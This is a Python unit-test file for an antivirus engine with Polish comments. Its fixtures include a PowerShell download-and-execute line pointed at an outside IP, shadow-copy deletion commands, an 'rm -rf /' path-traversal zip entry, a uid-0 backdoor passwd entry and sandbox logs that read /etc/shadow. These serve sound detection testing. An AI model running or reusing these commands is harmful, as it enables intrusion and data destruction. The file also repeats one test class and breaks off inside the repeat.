"""Testy silnika detekcji.

Uruchomienie:
    python3 -m unittest discover -s tests -v
albo:
    python3 tests/test_engine.py
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO))

from avengine.config import Config                       # noqa: E402
from avengine.entropy import shannon_entropy             # noqa: E402
from avengine.engine import Engine                       # noqa: E402
from avengine.hashing import imphash                     # noqa: E402
from avengine.models import Verdict                      # noqa: E402
from avengine.quarantine import Quarantine               # noqa: E402
from avengine.sigs.clamav import ClamAVDB, hexsig_to_regex  # noqa: E402

EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


def make_config(tmp: str) -> Config:
    cfg = Config()
    cfg.data_dir = Path(tmp)
    cfg.quarantine_enabled = True
    cfg.quarantine_on_malicious = True
    cfg.ensure_dirs()
    return cfg


class TestEntropy(unittest.TestCase):
    def test_zeros_have_zero_entropy(self):
        self.assertAlmostEqual(shannon_entropy(b"\x00" * 1024), 0.0)

    def test_random_data_is_high_entropy(self):
        self.assertGreater(shannon_entropy(os.urandom(65536)), 7.5)

    def test_text_is_low_entropy(self):
        self.assertLess(shannon_entropy(b"ala ma kota " * 200), 4.5)


class TestClamAVParser(unittest.TestCase):
    def test_simple_hex_signature(self):
        regex, prefix = hexsig_to_regex("6d6f7669")
        self.assertEqual(prefix, b"movi")
        import re
        self.assertTrue(re.compile(regex.encode("latin-1"), re.DOTALL).match(b"xxmovixx", 2))

    def test_wildcards(self):
        import re
        regex, prefix = hexsig_to_regex("6d6f??69")
        self.assertEqual(prefix, b"mo")
        self.assertTrue(re.compile(regex.encode("latin-1"), re.DOTALL).match(b"movi", 0))

    def test_alternatives_and_ranges(self):
        import re
        regex, _ = hexsig_to_regex("(aa|bb)[00-0f]")
        compiled = re.compile(regex.encode("latin-1"), re.DOTALL)
        self.assertTrue(compiled.match(b"\xaa\x05", 0))
        self.assertTrue(compiled.match(b"\xbb\x0f", 0))
        self.assertFalse(compiled.match(b"\xcc\x05", 0))

    def test_bounded_jump(self):
        import re
        regex, _ = hexsig_to_regex("aa{2-4}bb")
        compiled = re.compile(regex.encode("latin-1"), re.DOTALL)
        self.assertTrue(compiled.match(b"\xaa\x00\x00\xbb", 0))
        self.assertIsNone(compiled.search(b"\xaa\x00\x00\x00\x00\x00\xbb"))  # 5 bajtów > {2-4}

    def test_hdb_and_ndb_loading_and_match(self):
        with tempfile.TemporaryDirectory() as tmp:
            db = ClamAVDB()
            hdb = Path(tmp) / "test.hdb"
            hdb.write_text("44d88612fea8a8f36de82e1278abb02f:68:EICAR\n"      # md5 EICAR
                           "# komentarz\n")
            ndb = Path(tmp) / "test.ndb"
            ndb.write_text("Test.Sig.Name:0:*:deadbeefcafe\n")
            db.load_hash_file(hdb)
            db.load_pattern_file(ndb)
            db._reindex()

            self.assertEqual(db.lookup_hash("44d88612fea8a8f36de82e1278abb02f"), "EICAR")
            self.assertEqual(db.count(), 2)

            hits = db.match(b"padding\xde\xad\xbe\xef\xca\xfetrailing")
            self.assertEqual(len(hits), 1)
            self.assertEqual(hits[0][0], "Test.Sig.Name")
            self.assertEqual(db.match(b"nothing here"), [])

    def test_offset_anchor(self):
        db = ClamAVDB()
        sig = db._parse_ndb_line("Off.Sig:0:4:aabb")
        self.assertIsNotNone(sig)
        import re
        self.assertTrue(sig.regex.match(b"XXXX\xaa\xbb", 0))


class TestEngine(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        cfg = make_config(cls.tmp.name)
        cls.engine = Engine(cfg)
        # YARA nie jest potrzebna do testów jednostkowych warstw statycznych,
        # a jej ładowanie jest kosztowne - pomijamy je tutaj celowo.
        cls.engine.load(load_yara=False)

    @classmethod
    def tearDownClass(cls):
        cls.tmp.cleanup()

    def _scan_bytes(self, name: str, data: bytes):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / name
            path.write_bytes(data)
            return self.engine.scan_file(str(path))

    def test_eicar_is_malicious(self):
        result = self._scan_bytes("eicar.com", EICAR.encode())
        self.assertEqual(result.verdict, Verdict.MALICIOUS.value)
        self.assertGreaterEqual(result.score, 60)
        self.assertTrue(any("EICAR" in f.description or "EICAR" in (f.evidence or "")
                            for f in result.findings))

    def test_plain_text_is_clean(self):
        result = self._scan_bytes("notatka.txt", b"Spotkanie o 10:00 w pokoju 214.\n" * 10)
        self.assertEqual(result.verdict, Verdict.CLEAN.value,
                         f"fałszywy alarm: {[f.rule for f in result.findings]}")

    def test_high_entropy_binary_is_flagged(self):
        result = self._scan_bytes("payload.bin", os.urandom(128 * 1024))
        self.assertIn(result.verdict, (Verdict.SUSPICIOUS.value, Verdict.MALICIOUS.value))
        self.assertTrue(any(f.detector == "entropy" for f in result.findings))

    def test_powershell_dropper_is_flagged(self):
        ps = (b"$c = New-Object Net.WebClient\n"
              b"$d = $c.DownloadString('http://185.220.101.7/x')\n"
              b"Invoke-Expression $d\n")
        result = self._scan_bytes("drop.ps1", ps)
        self.assertNotEqual(result.verdict, Verdict.CLEAN.value)
        rules = {f.rule for f in result.findings}
        self.assertTrue(rules & {"powershell.ps_download",
                                 "powershell.ps_iex"},
                        f"rules={rules}")

    def test_ransomware_bat_flags_shadowcopy(self):
        bat = b"vssadmin delete shadows /all /quiet\nbcdedit /set {default} recoveryenabled no\n"
        result = self._scan_bytes("ransom.bat", bat)
        rules = {f.rule for f in result.findings}
        self.assertIn("batch.bat_shadowcopy", rules)
        self.assertGreaterEqual(result.score, 30)

    def test_compiled_sample_directory_contract(self):
        """Próbki z samples/ (jeśli istnieją) muszą dać oczekiwane werdykty."""
        samples = REPO / "samples"
        if not samples.exists():
            self.skipTest("brak katalogu samples - uruchom tools/make_samples.py")

        cases = {
            "eicar.com": Verdict.MALICIOUS.value,
            "clean/notatka.txt": Verdict.CLEAN.value,
            "malicious/packed_loader.exe": Verdict.MALICIOUS.value,
            "malicious/ransom_note.bat": Verdict.MALICIOUS.value,
            "suspicious/high_entropy_payload.bin": Verdict.SUSPICIOUS.value,
        }
        for name, expected in cases.items():
            path = samples / name
            if not path.exists():
                continue
            with self.subTest(sample=name):
                result = self.engine.scan_file(str(path))
                self.assertEqual(result.verdict, expected,
                                 f"{name}: {result.score} pkt, "
                                 f"reguły={[f.rule for f in result.findings]}")

    def test_quarantine_moves_and_restores(self):
        with tempfile.TemporaryDirectory() as tmp:
            q = Quarantine(Path(tmp) / "quarantine")
            target = Path(tmp) / "zły.exe"
            target.write_bytes(EICAR.encode())
            result = self.engine.scan_file(str(target))

            entry = q.add(str(target), result)
            self.assertIsNotNone(entry)
            self.assertFalse(target.exists(), "plik powinien zniknąć z oryginalnej ścieżki")
            self.assertEqual(len(q.list()), 1)

            dest = q.restore(entry.id, target_dir=tmp)
            self.assertIsNotNone(dest)
            self.assertTrue(Path(dest).exists())
            self.assertEqual(len(q.list()), 0)


class TestFileType(unittest.TestCase):
    def test_detects_pe_by_magic_not_extension(self):
        from avengine.filetype import detect
        samples = REPO / "samples" / "clean" / "program.exe"
        if not samples.exists():
            self.skipTest("brak próbek")
        self.assertEqual(detect(samples.read_bytes(), "kitten.jpg"), "pe")

    def test_text_detection(self):
        from avengine.filetype import detect
        self.assertEqual(detect(b"zwykly tekst", "a.txt"), "text")



class TestYaraClassification(unittest.TestCase):
    """Reguły informacyjne nie mogą być liczone jak wykrycia malware.

    Bez tej klasyfikacji zwykły plik PE dostawał ~100 pkt za same reguły
    w rodzaju IsPE32 / Microsoft_Visual_Cpp_8 / contains_base64.
    """

    def test_packer_and_compiler_rules_are_informational(self):
        from avengine.detectors.yara_layer import classify_rule, INFO
        self.assertEqual(classify_rule("yara-rules/packers/foo.yar", "UPX"), INFO)
        self.assertEqual(classify_rule("x.yar", "IsPE32"), INFO)
        self.assertEqual(classify_rule("x.yar", "Microsoft_Visual_Cpp_8"), INFO)
        self.assertEqual(classify_rule("x.yar", "contains_base64"), INFO)
        self.assertEqual(classify_rule("x.yar", "domain"), INFO)

    def test_malware_rules_are_decisive(self):
        from avengine.detectors.yara_layer import classify_rule, MALWARE
        self.assertEqual(classify_rule("yara-rules/malware/x.yar", "whatever"), MALWARE)
        self.assertEqual(classify_rule("x.yar", "apt_Chafer_Mar18"), MALWARE)
        self.assertEqual(classify_rule("x.yar", "gen_mal_downloader"), MALWARE)
        self.assertEqual(classify_rule("x.yar", "AgentTesla_Mar23"), MALWARE)
        self.assertEqual(classify_rule("x.yar", "expl_cve_2023_3519"), "exploit")

    def test_suspicious_rules_are_weak(self):
        from avengine.detectors.yara_layer import classify_rule, SUSPICIOUS
        self.assertEqual(classify_rule("x.yar", "anti_dbg"), SUSPICIOUS)
        self.assertEqual(classify_rule("x.yar", "gen_susp_obfuscation"), SUSPICIOUS)

    def test_meta_overrides_name(self):
        from avengine.detectors.yara_layer import meta_category, MALWARE, INFO
        self.assertEqual(meta_category({"threat_name": "Emotet"}), MALWARE)
        self.assertEqual(meta_category({"type": "packer"}), INFO)
        self.assertIsNone(meta_category({}))

    def test_weak_signals_cannot_convict(self):
        """Sama sterta słabych sygnałów YARA nie może dać werdyktu „złośliwy”."""
        from avengine.detectors.yara_layer import YaraDetector, MAX_WEAK_SCORE
        self.assertLess(MAX_WEAK_SCORE, 25)  # poniżej progu „podejrzany”...

    def test_clean_pe_stays_clean_with_yara_layer(self):
        from avengine.config import Config
        from avengine.engine import Engine
        sample = REPO / "samples" / "clean" / "program.exe"
        if not sample.exists():
            self.skipTest("brak próbki")
        with tempfile.TemporaryDirectory() as tmp:
            # Używamy PRAWDZIWEJ bazy reguł (a nie pustego katalogu tymczasowego),
            # bo to właśnie reguły społecznościowe generowały fałszywe alarmy.
            cfg = make_config(tmp)
            real_yara = REPO / "data" / "sigs" / "yara"
            if real_yara.exists():
                cfg = Config()
            engine = Engine(cfg)
            engine.load(load_yara=True)
            self.assertGreater(engine.store.yara.rule_count, 100,
                               "test ma sens tylko z załadowanymi regułami społecznościowymi")
            result = engine.scan_file(str(sample))
            self.assertEqual(result.verdict, Verdict.CLEAN.value,
                             f"fałszywy alarm: {[(f.rule, f.weight) for f in result.findings]}")



SAMPLES = Path(__file__).resolve().parent.parent / "samples"


class TestDocumentAnalysis(unittest.TestCase):
    """Dokumenty to dziś główny wektor infekcji - muszą być analizowane."""

    def _engine(self, tmp):
        engine = Engine(make_config(tmp))
        engine.load(load_yara=False)
        return engine

    def _scan(self, tmp, path: Path):
        return self._engine(tmp).scan_file(str(path))

    def test_pdf_with_javascript_and_openaction(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = self._scan(tmp, SAMPLES / "malicious" / "raport.pdf")
            rules = [f.rule for f in result.findings]
            self.assertIn("pdf_js_auto", rules, f"nie wykryto: {rules}")
            self.assertEqual(result.verdict, Verdict.MALICIOUS.value)

    def test_clean_pdf_stays_clean(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = self._scan(tmp, SAMPLES / "clean" / "dokument.pdf")
            doc_findings = [f.rule for f in result.findings if f.detector == "documents"]
            self.assertEqual(doc_findings, [], f"fałszywy alarm: {doc_findings}")
            self.assertEqual(result.verdict, Verdict.CLEAN.value)

    def test_ooxml_macro_is_detected_with_details(self):
        """Makro musi być nie tylko wykryte, ale i opisane (co robi)."""
        with tempfile.TemporaryDirectory() as tmp:
            result = self._scan(tmp, SAMPLES / "malicious" / "faktura.docm")
            rules = [f.rule for f in result.findings]
            self.assertIn("ooxml_macro", rules, f"nie wykryto makra: {rules}")
            # Szczegóły są ważniejsze od samej flagi: analityk musi wiedzieć,
            # że makro uruchamia się samo i pobiera coś z sieci.
            self.assertIn("vba_autorun", rules)
            self.assertIn("macro_download", rules)

    def test_clean_docx_stays_clean(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = self._scan(tmp, SAMPLES / "clean" / "raport.docx")
            doc_findings = [f.rule for f in result.findings if f.detector == "documents"]
            self.assertEqual(doc_findings, [], f"fałszywy alarm: {doc_findings}")


class TestMitreMapping(unittest.TestCase):
    def test_known_techniques_are_mapped(self):
        from avengine import mitre
        cases = {
            ("pe_heuristics", "api_hollowing"): "T1055.012",
            ("pe_heuristics", "api_ransomware"): "T1486",
            ("documents", "pdf_js_auto"): "T1204.002",
            ("rootkit", "ld_so_preload"): "T1574.006",
            ("archive", "nested_threat"): "T1566.001",
        }
        for (detector, rule), expected in cases.items():
            technique = mitre.map_finding(detector, rule)
            self.assertIsNotNone(technique, f"{detector}/{rule} nie zmapowane")
            self.assertEqual(technique.id, expected)

    def test_chain_bonus_grows_with_distinct_tactics(self):
        from avengine import mitre
        self.assertEqual(mitre.chain_bonus(1), 0)
        self.assertEqual(mitre.chain_bonus(2), 5)
        self.assertEqual(mitre.chain_bonus(3), 12)
        self.assertGreater(mitre.chain_bonus(4), mitre.chain_bonus(3))
        # Pojedynczy sygnał nie dostaje premii - inaczej każdy szum rósłby.
        self.assertEqual(mitre.chain_bonus(0), 0)


class TestCorrelation(unittest.TestCase):
    def _engine(self, tmp):
        engine = Engine(make_config(tmp))
        engine.load(load_yara=False)
        return engine

    def test_attack_chain_adds_points(self):
        """Spójny łańcuch sygnałów to coś więcej niż suma części."""
        with tempfile.TemporaryDirectory() as tmp:
            engine = self._engine(tmp)
            result = engine.scan_file(str(SAMPLES / "malicious" / "dropper.ps1"))
            rules = [f.rule for f in result.findings]
            self.assertIn("attack_chain", rules, f"brak korelacji: {rules}")

    def test_findings_carry_mitre_ids(self):
        with tempfile.TemporaryDirectory() as tmp:
            engine = self._engine(tmp)
            result = engine.scan_file(str(SAMPLES / "malicious" / "packed_loader.exe"))
            self.assertTrue(any(f.mitre for f in result.findings),
                            "żadne znalezisko nie ma przypisanej techniki ATT&CK")

    def test_heuristics_are_discounted_in_system_dirs(self):
        """Ten sam plik w katalogu systemowym dostaje mniej punktów heurystyki."""
        import os
        from avengine.detectors import correlation as corr
        with tempfile.TemporaryDirectory() as tmp:
            engine = self._engine(tmp)
            payload = bytes(range(256)) * 40
            home = os.path.join(tmp, "home", "user", "payload.bin")
            os.makedirs(os.path.dirname(home), exist_ok=True)
            Path(home).write_bytes(payload)
            result_home = engine.scan_bytes(home, payload)

            usr = os.path.join(tmp, "usr", "bin", "payload.bin")
            os.makedirs(os.path.dirname(usr), exist_ok=True)
            original = corr.TRUSTED_DIRS
            corr.TRUSTED_DIRS = original + (os.path.dirname(usr).lower(),)
            try:
                result_usr = engine.scan_bytes(usr, payload)
            finally:
                corr.TRUSTED_DIRS = original
            self.assertLessEqual(result_usr.score, result_home.score,
                                 "plik w katalogu systemowym powinien dostać rabat")


class TestIntegrityScanning(unittest.TestCase):
    """Testy rootkitów używają syntetycznych katalogów - nie ruszamy /proc."""

    def _scanner(self):
        from avengine.rootkit import IntegrityScanner
        return IntegrityScanner()

    def test_ld_so_preload_is_critical(self):
        from avengine import rootkit
        with tempfile.TemporaryDirectory() as tmp:
            fake = Path(tmp) / "ld.so.preload"
            fake.write_text("/usr/lib/libhide.so\n")
            original = rootkit.PRELOAD_PATH
            rootkit.PRELOAD_PATH = fake
            try:
                report = self._scanner().scan()
            finally:
                rootkit.PRELOAD_PATH = original
            rules = [f["rule"] for f in report["findings"]]
            self.assertIn("ld_so_preload", rules)

    def test_hidden_process_is_critical(self):
        from avengine import rootkit
        with tempfile.TemporaryDirectory() as tmp:
            proc = Path(tmp) / "proc"
            (proc / "999999").mkdir(parents=True)
            (proc / "999999" / "cmdline").write_bytes(b"/usr/lib/.hidden/kworker\x00")
            original = rootkit.PROC_PATH
            rootkit.PROC_PATH = proc
            try:
                report = self._scanner().scan()
            finally:
                rootkit.PROC_PATH = original
            rules = [f["rule"] for f in report["findings"]]
            self.assertIn("hidden_process", rules)

    def test_extra_uid_zero_account(self):
        from avengine import rootkit
        with tempfile.TemporaryDirectory() as tmp:
            fake = Path(tmp) / "passwd"
            fake.write_text("root:x:0:0:root:/root:/bin/bash\n"
                            "backdoor:x:0:0::/home/backdoor:/bin/bash\n")
            original = rootkit.PASSWD_PATH
            rootkit.PASSWD_PATH = fake
            try:
                report = self._scanner().scan()
            finally:
                rootkit.PASSWD_PATH = original
            rules = [f["rule"] for f in report["findings"]]
            self.assertIn("uid_zero_account", rules)

    def test_suid_binary_in_world_writable_dir(self):
        import stat as statmod
        from avengine import rootkit
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / ".evil"
            target.write_bytes(b"#!/bin/sh\n")
            target.chmod(target.stat().st_mode | statmod.S_ISUID)
            original = rootkit.SHADY_EXEC_DIRS
            rootkit.SHADY_EXEC_DIRS = (str(tmp) + "/",)
            try:
                report = self._scanner().scan()
            finally:
                rootkit.SHADY_EXEC_DIRS = original
            rules = [f["rule"] for f in report["findings"]]
            self.assertIn("suid_in_writable", rules)

    def test_hidden_socket_check_skipped_without_permissions(self):
        """Bez prawa odczytu /proc/*/fd test musi odpuścić, a nie alarmować."""
        from avengine import rootkit
        with tempfile.TemporaryDirectory() as tmp:
            proc = Path(tmp) / "proc"
            (proc / "1").mkdir(parents=True)
            net = proc / "net"
            net.mkdir()
            (net / "tcp").write_text(
                "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt"
                "   uid  timeout inode\n"
                "   0: 00000000:006F 00000000:0000 0A 00000000:00000000 00:00000000 00000000"
                "     0        0 422 1 0000000000000000 100 0 0 10 0\n")
            original_proc, original_net = rootkit.PROC_PATH, rootkit.NET_TCP_PATHS
            rootkit.PROC_PATH = proc
            rootkit.NET_TCP_PATHS = (net / "tcp",)
            try:
                report = self._scanner().scan()
            finally:
                rootkit.PROC_PATH = original_proc
                rootkit.NET_TCP_PATHS = original_net
            rules = [f["rule"] for f in report["findings"]]
            self.assertNotIn("hidden_port", rules,
                             "fałszywy alarm: gniazdka bez widocznych deskryptorów")
            self.assertTrue(any("hidden_sockets" in s for s in report["skipped"]))




class TestBehaviorSandbox(unittest.TestCase):
    """Analiza behawioralna: uruchamiamy próbkę i patrzymy, co robi.

    Wymaga kompilatora C (gcc) do zbudowania interceptora wywołań libc.
    Próbki są własne i niegroźne: piszą tylko w katalogu piaskownicy, a
    użyty adres 192.0.2.x należy do zarezerwowanego zakresu testowego.
    """

    def _sandbox(self, tmp, timeout: int = 25):
        from avengine.behavior import BehaviorSandbox
        return BehaviorSandbox(Path(tmp), timeout=timeout)

    def test_interceptor_is_built(self):
        import shutil
        if not (shutil.which("gcc") or shutil.which("cc")):
            self.skipTest("brak kompilatora C")
        from avengine.behavior import build_interceptor
        with tempfile.TemporaryDirectory() as tmp:
            library = build_interceptor(Path(tmp))
            self.assertIsNotNone(library, "kompilacja interceptora nie powiodła się")
            self.assertTrue(Path(library).exists())

    def _skip_without_gcc(self):
        import shutil
        if not (shutil.which("gcc") or shutil.which("cc")):
            self.skipTest("brak kompilatora C")

    def test_malicious_behavior_is_detected(self):
        self._skip_without_gcc()
        with tempfile.TemporaryDirectory() as tmp:
            report = self._sandbox(tmp).run(SAMPLES / "malicious" / "behav_dropper.py")
            self.assertEqual(report.error, "", report.error)
            self.assertTrue(report.executed)
            rules = {f.rule for f in report.findings}
            for expected in ("persistence_write", "credential_access", "network_c2",
                             "mass_file_write", "self_delete", "encrypted_content"):
                self.assertIn(expected, rules, f"nie wykryto {expected}: {sorted(rules)}")
            self.assertEqual(report.verdict, "malicious")

    def test_benign_behavior_stays_clean(self):
        """Zwykły skrypt nie może dostać ani punktu - to test na fałszywe alarmy."""
        self._skip_without_gcc()
        with tempfile.TemporaryDirectory() as tmp:
            report = self._sandbox(tmp).run(SAMPLES / "clean" / "behav_benign.sh")
            self.assertEqual(report.error, "", report.error)
            self.assertEqual(report.findings, [],
                             f"fałszywy alarm: {[f.rule for f in report.findings]}")
            self.assertEqual(report.verdict, "clean")

    def test_network_endpoints_are_parsed_correctly(self):
        """Pola CONNECT (rodzina/host/port) nie mogą się przesuwać."""
        self._skip_without_gcc()
        with tempfile.TemporaryDirectory() as tmp:
            report = self._sandbox(tmp).run(SAMPLES / "malicious" / "behav_dropper.py")
            endpoint = next((n for n in report.network if n["port"] == 4444), None)
            self.assertIsNotNone(endpoint, f"nie sparsowano połączenia: {report.network}")
            self.assertEqual(endpoint["host"], "192.0.2.1")
            self.assertEqual(endpoint["family"], "ipv4")

    def test_findings_carry_mitre_ids(self):
        self._skip_without_gcc()
        with tempfile.TemporaryDirectory() as tmp:
            report = self._sandbox(tmp).run(SAMPLES / "malicious" / "behav_dropper.py")
            self.assertTrue(report.findings)
            for finding in report.findings:
                self.assertTrue(finding.mitre,
                                f"{finding.rule} nie ma przypisanej techniki ATT&CK")

    def test_report_is_serialisable(self):
        self._skip_without_gcc()
        with tempfile.TemporaryDirectory() as tmp:
            report = self._sandbox(tmp).run(SAMPLES / "clean" / "behav_benign.sh")
            payload = json.loads(json.dumps(report.to_dict(), ensure_ascii=False))
            self.assertEqual(payload["verdict"], "clean")
            self.assertTrue(payload["limitations"], "raport musi wymieniać ograniczenia")
            self.assertIn("Analiza behawioralna", report.render_text())

    def test_windows_only_script_is_reported_not_run(self):
        self._skip_without_gcc()
        with tempfile.TemporaryDirectory() as tmp:
            report = self._sandbox(tmp).run(SAMPLES / "malicious" / "dropper.ps1")
            self.assertTrue(report.error, "skrypt PowerShell nie powinien być uruchomiony")
            self.assertFalse(report.executed)

    def test_log_parser_handles_every_event_kind(self):
        """Parser dziennika musi rozumieć każdy rodzaj zdarzenia interceptora."""
        from avengine.behavior import BehaviorSandbox
        with tempfile.TemporaryDirectory() as tmp:
            log = Path(tmp) / "behavior.log"
            log.write_text(
                "OPEN\t1\t/tmp/a.txt\twrite\n"
                "OPEN\t1\t/etc/shadow\tread\n"
                "EXEC\t1\t/usr/bin/curl\thttp://x/y\n"
                "DELETE\t1\t/tmp/b.txt\n"
                "MOVE\t1\t/tmp/c\t/tmp/d\n"
                "CONNECT\t1\tipv4\t192.0.2.1\t4444\n"
                "SOCKET\t1\tipv4\ttcp\n"
                "MKDIR\t1\t/tmp/e\n")
            events = BehaviorSandbox._parse_log(log)
            kinds = [e.kind for e in events]
            self.assertEqual(kinds, ["OPEN", "OPEN", "EXEC", "DELETE", "MOVE",
                                     "CONNECT", "SOCKET", "MKDIR"])
            connect = next(e for e in events if e.kind == "CONNECT")
            self.assertEqual(connect.path, "ipv4")
            self.assertEqual(connect.extra, "192.0.2.1\t4444")


if __name__ == "__main__":
    unittest.main(verbosity=2)


class TestArchiveScanning(unittest.TestCase):
    """Malware podróżuje w archiwach - skaner musi zaglądać do środka."""

    def _engine(self, tmp):
        engine = Engine(make_config(tmp))
        engine.load(load_yara=False)
        return engine

    def _zip(self, members: dict) -> bytes:
        import io
        import zipfile
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            for name, data in members.items():
                zf.writestr(name, data)
        return buf.getvalue()

    def test_eicar_inside_zip_is_detected(self):
        with tempfile.TemporaryDirectory() as tmp:
            engine = self._engine(tmp)
            payload = self._zip({"faktura.pdf.exe": EICAR.encode()})
            result = engine.scan_bytes("/tmp/faktura.zip", payload)
            self.assertEqual(result.verdict, Verdict.MALICIOUS.value)
            self.assertTrue(any(f.rule == "nested_threat" for f in result.findings))

    def test_clean_zip_stays_clean(self):
        with tempfile.TemporaryDirectory() as tmp:
            engine = self._engine(tmp)
            payload = self._zip({"notatka.txt": "Spotkanie o 10:00 w pokoju 214."})
            result = engine.scan_bytes("/tmp/czyste.zip", payload)
            self.assertEqual(result.verdict, Verdict.CLEAN.value,
                             f"fałszywy alarm: {[f.rule for f in result.findings]}")

    def test_path_traversal_is_flagged(self):
        from avengine.archives import ArchiveScanner
        with tempfile.TemporaryDirectory() as tmp:
            engine = self._engine(tmp)
            payload = self._zip({"../../../../etc/evil.sh": "rm -rf /"})
            scanner = ArchiveScanner(engine)
            findings, _report = scanner.scan("/tmp/z.zip", payload, "zip")
            self.assertTrue(any(f.rule == "path_traversal" for f in findings))

    def test_zip_bomb_is_refused(self):
        """1 MB archiwum nie może rozpakować się do gigabajtów."""
        from avengine.archives import ArchiveScanner
        with tempfile.TemporaryDirectory() as tmp:
            engine = self._engine(tmp)
            import io
            import zipfile
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
                zf.writestr("bomb.bin", b"\x00" * (80 * 1024 * 1024))   # 80 MB zer
            compressed = buf.getvalue()
            self.assertLess(len(compressed), 1024 * 1024)

            scanner = ArchiveScanner(engine)
            scanner.max_ratio = 100
            findings, report = scanner.scan("/tmp/bomb.zip", compressed, "zip")
            notes = " ".join(report.notes)
            self.assertIn("bomb", notes.lower())
            self.assertFalse(report.threats)

    def test_encrypted_archive_is_reported_as_unverified(self):
        """Zaszyfrowane archiwum to „nieprzebadane", nie „czyste"."""
        py7zr = pytest_import("py7zr")
        if py7zr is None:
            self.skipTest("brak py7zr")
        from avengine.archives import ArchiveScanner
        import io

        buf = io.BytesIO()
        with py7zr.SevenZipFile(buf, "w", password="haslo") as archive:
            archive.writeall(str(REPO / "samples" / "clean" / "notatka.txt"), "notatka.txt")
        payload = buf.getvalue()

        with tempfile.TemporaryDirectory() as tmp:
            engine = self._engine(tmp)
            scanner = ArchiveScanner(engine)
            findings, report = scanner.scan("/tmp/x.7z", payload, "7z")
            flagged = (
                any(f.rule in ("encrypted_archive", "unscannable") for f in findings)
                or any("zaszyfrowan" in note.lower() for note in report.notes))
            self.assertTrue(flagged,
                            f"findings={[f.rule for f in findings]} notes={report.notes}")
            self.assertFalse(report.threats, "nieprzebadane != czyste, ale i nie=złośliwe")


def pytest_import(name):
    try:
        return __import__(name)
    except ImportError:
        return None


class TestProcessAndStartupHelpers(unittest.TestCase):
    """Testy funkcji pomocniczych (pełny skan procesów jest testem integracyjnym)."""

    def test_system_dir_detection(self):
        from avengine.processes import _in_system_dir, _in_temp_dir
        self.assertTrue(_in_system_dir("/usr/bin/sshd"))
        self.assertTrue(_in_system_dir("c:\\windows\\system32\\svchost.exe"))
        self.assertTrue(_in_temp_dir("/tmp/aktualizacja.exe"))
        self.assertTrue(_in_temp_dir("c:\\users\\a\\appdata\\local\\temp\\x.exe"))
        self.assertFalse(_in_temp_dir("/usr/bin/ls"))

    def test_startup_target_extraction(self):
        from avengine.startup_audit import _extract_target
        self.assertEqual(_extract_target("/usr/bin/backup.sh --daily"), "/usr/bin/backup.sh")
        self.assertEqual(_extract_target('"/opt/app/run.sh" -v'), "/opt/app/run.sh")
        self.assertEqual(_extract_target("bash -c '/tmp/x.sh'"), "/tmp/x.sh")
        self.assertEqual(_extract_target("https://evil.example/x.sh"), "")
        self.assertEqual(_extract_target(""), "")

    def test_process_scanner_reports_structure(self):
        from avengine.processes import ProcessScanner
        with tempfile.TemporaryDirectory() as tmp:
            engine = Engine(make_config(tmp))
            engine.load(load_yara=False)
            report = ProcessScanner(engine).scan(include_connections=False)
            self.assertIn("counts", report)
            self.assertIn("processes", report)
            self.assertGreater(report["counts"]["total"], 0)
            # Wątki jądra nie mogą być raportowane jako malware.
            self.assertEqual(report["counts"]["malicious"], 0,
                             "fałszywy alarm na procesach systemowych")

    def test_startup_audit_returns_entries(self):
        from avengine.startup_audit import StartupAuditor
        with tempfile.TemporaryDirectory() as tmp:
            engine = Engine(make_config(tmp))
            engine.load(load_yara=False)
            report = StartupAuditor(engine).audit()
            self.assertIn("entries", report)
            self.assertIn("counts", report)
            self.assertGreater(report["counts"]["total"], 0)


class TestReports(unittest.TestCase):
    def test_html_report_contains_verdicts(self):
        from avengine.report import render_html, render_json, write_report
        with tempfile.TemporaryDirectory() as tmp:
            engine = Engine(make_config(tmp))
            engine.load(load_yara=False)
            summary = engine.scan_paths([str(REPO / "samples")], workers=4)
            html_text = render_html(summary, {"version": "test", "hostname": "testhost"})
            self.assertIn("ZŁOŚLIWY", html_text)
            self.assertIn("eicar.com", html_text)
            self.assertIn("Raport skanu", html_text)

            payload = json.loads(render_json(summary))
            self.assertIn("results", payload)
            self.assertGreater(payload["summary"]["malicious"], 0)

            out = Path(tmp) / "raport.html"
            write_report(summary, str(out), fmt="html")
            self.assertTrue(out.exists())


class TestYaraSuppression(unittest.TestCase):
    def test_packaged_suppression_list_is_loaded(self):
        """Reguły z listy tłumień nie mogą punktować."""
        with tempfile.TemporaryDirectory() as tmp:
            engine = Engine(make_config(tmp))
            engine.load(load_yara=False)
            engine.store.yara.load_suppressions()
            self.assertIn("PoetRat_Python", engine.store.yara.suppressed_rules)

    def test_canary_rules_are_excluded(self):
        with tempfile.TemporaryDirectory() as tmp:
            engine = Engine(make_config(tmp))
            cfg = Config()
            engine.store.yara.load_directory(cfg.yara_dir)
            # Reguła "domain" pasuje do danych losowych - musi zostać odrzucona.
            if engine.store.yara.rules or engine.store.yara.info_rules:
                self.assertIn("domain", engine.store.yara.noisy_rules)



SAMPLES = Path(__file__).resolve().parent.parent / "samples"


class TestDocumentAnalysis(unittest.TestCase):
    """Dokumenty to dziś główny wektor infekcji - muszą być analizowane."""

    def _engine(self, tmp):
        engine = Engine(make_config(tmp))
        engine.load(load_yara=False)
        return engine

    def _scan(self, tmp, path: Path):
        return self._engine(tmp).scan_file(str(path))

    def test_pdf_with_javascript_and_openaction(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = self._scan(tmp, SAMPLES / "malicious" / "raport.pdf")
            rules = [f.rule for f in result.findings]
            self.assertIn("pdf_js_auto", rules, f"nie wykryto: {rules}")
            self.assertEqual(result.verdict, Verdict.MALICIOUS.value)

    def test_clean_pdf_stays_clean(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = self._scan(tmp, SAMPLES / "clean" / "dokument.pdf")
